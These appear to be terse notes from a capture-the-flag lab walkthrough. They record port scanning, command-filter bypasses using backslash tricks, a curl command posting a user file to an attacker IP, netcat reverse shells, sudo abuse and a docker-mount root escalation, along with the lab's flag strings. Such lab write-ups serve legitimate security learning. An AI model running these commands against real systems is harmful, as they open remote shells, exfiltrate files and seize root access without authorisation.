# Investigate

## Notes
```
nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

gobuster finds /secret

not allowed
ls, cat, ping, python, nc, less, more

allowed
pwd, curl, find, base64

curl --data "@/home/www-data/user.txt" http://10.9.18.129:4444/a

Data exfiltration
https://book.hacktricks.xyz/exfiltration

netcat -e /bin/sh 10.9.18.129 4444
netcat -e /bin/bash 10.9.18.129 4444
netcat -c bash 10.9.18.129 4444
netcat 10.9.18.129 4444 -e /bin/bash

base64 can be used to read files

connect to ftp to get notes.txt

sudo -l
/home/apaar/.helpline.sh can be run

l\s works!!!

curl revshell | ba\sh

run helpline.sh as apaar, and spawn /bin/bash, cat out the file

fcrackzip => tool to crack zip pwd
```

## Questions
1. User flag
```
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}
```

2. Root flag
```
explore /var/www/files
stehide extract jpg
crack zip file pwd
decode password from source code
ssh as anurodh

docker run -v /:/mnt --rm -it alpine chroot /mnt sh

{ROOT-FLAG: w18gfpn9xehsgd3tovhk0hby4gdp89bg}
```